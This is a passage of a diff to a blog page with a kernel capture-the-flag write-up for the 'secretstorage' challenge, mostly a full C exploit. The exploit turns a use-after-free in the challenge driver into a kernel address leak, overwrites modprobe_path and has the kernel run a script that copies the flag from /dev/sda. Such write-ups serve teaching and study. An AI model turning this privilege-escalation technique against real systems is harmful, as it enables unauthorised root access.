+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(resize, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x50</span>);
+</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)resize)[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)resize)[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> mpp;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">doresize</span>(<span style="color:#ae81ff">0</span>, name, <span style="color:#ae81ff">0x60</span>, resize);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dowrite</span>(<span style="color:#ae81ff">0</span>, name, <span style="color:#ae81ff">0x10</span>, overwrite);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">get_flag</span>();
+</span></span></code></pre></div><p>Here is the before overwrite:</p>
+<p><img src="/post/secretstorage/images/beforeoverwrite.jpg" alt="beforeoverwrite"></p>
+<p>And after overwrite:</p>
+<p><img src="/post/secretstorage/images/afteroverwrite.jpg" alt="afteroverwrite"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">get_flag</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo &#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">head -n 1 /dev/sda &gt; /tmp/flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">chmod 777 &#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;/tmp/flag&#39; &gt; /tmp/x&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /tmp/x&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff&#39; &gt; /tmp/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /tmp/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Run unknown file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/tmp/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Read flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /tmp/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The script basically copies the stuff in <code>/dev/sda</code> into <code>/tmp/flag</code> as well as granting it full permissions and makes it executable. Then it makes an unknown file and runs it which should then trigger <code>modprobe_path</code> and run the script and now the flag from <code>/dev/sda</code> is inside <code>/tmp/flag</code> and we can view it.</p>
+<p><img src="/post/secretstorage/images/finalflag.jpg" alt="finalflag"></p>
 <p>WAHEY! It worked, that&rsquo;s fantabbitastic.</p>
 <p>Overall, this challenge was very fun and got me thinking in the kernel pwn mindset instead of the userland pwn mindset and serves as a great introduction to possible kernel structs and how the kernel heap works.</p>
 <p>Anyways, that&rsquo;s it for this text based youtube video. Please make sure to like 👍 and soobscribe and make sure to turn on the notification bell🔔 and see you guys <a href="https://youtu.be/oC2zvQ6B1Dw?si=Roa2V2vUd-jVzFRb">next time</a>.</p>
-
-    <h4><a href="http://localhost:1313/">Back to Home</a></h4>
+<p>Here is my script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/userfaultfd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;poll.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sched.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/wait.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DO_CREATE 0xc020ca00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DO_READ 0xc020ca01
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DO_WRITE 0xc020ca02
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DO_RESIZE 0xc020ca03
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DO_DELETE 0xc020ca04
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> idx;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> name_addr;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> note_size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> note_addr;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> box {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x50</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> note_size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> note_addr;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">opendev</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/secretstorage&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;open failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Device opened successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">cpuaff</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Setting cpu affinity</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">cpu_set_t</span> cpu;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CPU_SET</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">cpu_set_t</span>), <span style="color:#f92672">&amp;</span>cpu)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Sched_setaffinity not working</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">create</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name, <span style="color:#66d9ef">uint64_t</span> note_size, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>note) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Creating box</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> req userdata;
+</span></span><span style="display:flex;"><span>  userdata.name_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)name;
+</span></span><span style="display:flex;"><span>  userdata.note_size <span style="color:#f92672">=</span> note_size;
+</span></span><span style="display:flex;"><span>  userdata.note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)note;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(fd, DO_CREATE, <span style="color:#f92672">&amp;</span>userdata);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;DO CREATE FAILED&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">doread</span>(<span style="color:#66d9ef">uint64_t</span> idx, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>namebuf, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>notebuf) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Reading from idx: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>)idx);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> req userdata;
+</span></span><span style="display:flex;"><span>  userdata.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>  userdata.name_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)namebuf;
+</span></span><span style="display:flex;"><span>  userdata.note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)notebuf;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(fd, DO_READ, <span style="color:#f92672">&amp;</span>userdata);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;DO_READ FAILED&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dowrite</span>(<span style="color:#66d9ef">uint64_t</span> idx, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name, <span style="color:#66d9ef">uint64_t</span> note_size, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>note) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Writing to box at idx: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>)idx);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> req userdata;
+</span></span><span style="display:flex;"><span>  userdata.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>  userdata.name_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)name;
+</span></span><span style="display:flex;"><span>  userdata.note_size <span style="color:#f92672">=</span> note_size;
+</span></span><span style="display:flex;"><span>  userdata.note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)note;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(fd, DO_WRITE, <span style="color:#f92672">&amp;</span>userdata);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;DO WRITE FAILED&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">doresize</span>(<span style="color:#66d9ef">uint64_t</span> idx, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name, <span style="color:#66d9ef">uint64_t</span> note_size, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>note) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Resizing box at idx: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>)idx);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> req userdata;
+</span></span><span style="display:flex;"><span>  userdata.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>  userdata.name_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)name;
+</span></span><span style="display:flex;"><span>  userdata.note_size <span style="color:#f92672">=</span> note_size;
+</span></span><span style="display:flex;"><span>  userdata.note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)note;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(fd, DO_RESIZE, <span style="color:#f92672">&amp;</span>userdata);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;DO_RESIZE FAILED&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dodelete</span>(<span style="color:#66d9ef">uint64_t</span> idx) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Deleting box at idx: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>)idx);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> req userdata;
+</span></span><span style="display:flex;"><span>  userdata.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(fd, DO_DELETE, <span style="color:#f92672">&amp;</span>userdata);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;DO_DELETE FAILED&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">get_flag</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo &#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">head -n 1 /dev/sda &gt; /tmp/flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">chmod 777 &#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;/tmp/flag&#39; &gt; /tmp/x&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /tmp/x&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff&#39; &gt; /tmp/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /tmp/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Run unknown file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/tmp/dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Read flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /tmp/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cpuaff</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">opendev</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x50</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> note[<span style="color:#ae81ff">0x100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> readname[<span style="color:#ae81ff">0x100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> readnote[<span style="color:#ae81ff">0x100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(note, <span style="color:#ae81ff">0x42</span>, <span style="color:#66d9ef">sizeof</span>(note));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">create</span>(name, <span style="color:#ae81ff">0x100</span>, note);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">create</span>(name, <span style="color:#ae81ff">0x100</span>, note);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dodelete</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">22</span>, AF_INET, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">doread</span>(<span style="color:#ae81ff">0</span>, readname, readnote);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;subprocess_info struct</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">0x50</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)readname)[i]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset of mpp from call_usermodehelper_exec_work is 0x1a94080
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> mpp <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)readname)[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1a94080</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;This is mpp: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, mpp);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> overwrite[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(overwrite, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(overwrite));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(overwrite, <span style="color:#e6db74">&#34;/tmp/x</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> resize[<span style="color:#ae81ff">0x100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(resize, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x50</span>);
+</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)resize)[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)resize)[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> mpp;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">doresize</span>(<span style="color:#ae81ff">0</span>, name, <span style="color:#ae81ff">0x60</span>, resize);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dowrite</span>(<span style="color:#ae81ff">0</span>, name, <span style="color:#ae81ff">0x10</span>, overwrite);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">get_flag</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code></code></pre>
+    <h4><a href="https://waheyy.github.io/">Back to Home</a></h4>
 </div>
 
 
